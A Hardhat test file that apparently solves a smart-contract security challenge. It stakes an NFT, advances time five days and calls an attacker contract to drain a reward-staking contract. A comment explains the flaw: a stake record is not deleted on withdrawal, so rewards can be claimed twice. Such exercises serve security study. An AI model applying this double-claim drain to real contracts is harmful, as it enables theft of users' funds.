const { time, loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
const { anyValue } = require('@nomicfoundation/hardhat-chai-matchers/withArgs');
const { expect } = require('chai');
const { ethers } = require('hardhat');

const NAME = 'RewardToken';

describe(NAME, function () {
	async function setup() {
		const [, attackerWallet] = await ethers.getSigners();

		const AttackerFactory = await ethers.getContractFactory('RewardTokenAttacker');
		const attackerContract = await AttackerFactory.deploy();

		const NFTToStakeFactory = await ethers.getContractFactory('NftToStake');
		const NFTToStakeContract = await NFTToStakeFactory.deploy(attackerContract.address);

		const DepositoorFactory = await ethers.getContractFactory('Depositoor');
		const depositoorContract = await DepositoorFactory.deploy(NFTToStakeContract.address);

		const RewardTokenFactory = await ethers.getContractFactory(NAME);
		const rewardTokenContract = await RewardTokenFactory.deploy(depositoorContract.address);

		await depositoorContract.setRewardToken(rewardTokenContract.address);

		return {
			attackerContract,
			NFTToStakeContract,
			depositoorContract,
			rewardTokenContract,
			attackerWallet,
		};
	}

	describe('exploit', async function () {
		let attackerContract,
			NFTToStakeContract,
			depositoorContract,
			rewardTokenContract,
			attackerWallet;
		before(async function () {
			({
				attackerContract,
				NFTToStakeContract,
				depositoorContract,
				rewardTokenContract,
				attackerWallet,
			} = await loadFixture(setup));
		});

		/**
		 * The protocol's desgin as below:
		 * To ensure fairness, nobody can claim more than half the supply in the contract.
		 * 
		 * But there is a vulnerability which means one when one withdrawAndClaimEarnings then he get the rewards and bring back the nft, but at this point the nft data 
		 * doesn't delete in the Depositoor contract. So this caller can continue call claimEarnings and still get rewards. This means the staker can get the double rewards.
		 * 
		 * Hack step:
		 * 1: stake NFT
		 * 2: after 5 days, call withdrawAndClaimEarnings. Because the  REWARD_RATE = 10e18 / uint256(1 days); and there are 100e18 in Depositoor contract. so 5 days can get 50e18.
		 * double withdraw rewards can get all rewards
		 * 
		 */
		// prettier-ignore
		it("conduct your attack here", async function () {

			await attackerContract.connect(attackerWallet).stakeNFT(depositoorContract.address,42);
			// assume 5 days passed
			await time.increase(86400*5);

			await attackerContract.connect(attackerWallet).attack(42);
  
      });

		after(async function () {
			expect(await rewardTokenContract.balanceOf(attackerContract.address)).to.be.equal(
				ethers.utils.parseEther('100'),
				'Balance of attacking contract must be 100e18 tokens'
			);
			expect(await rewardTokenContract.balanceOf(depositoorContract.address)).to.be.equal(
				0,
				'Attacked contract must be fully drained'
			);
			expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
				3,
				'must exploit in two transactions or less'
			);
		});
	});
});
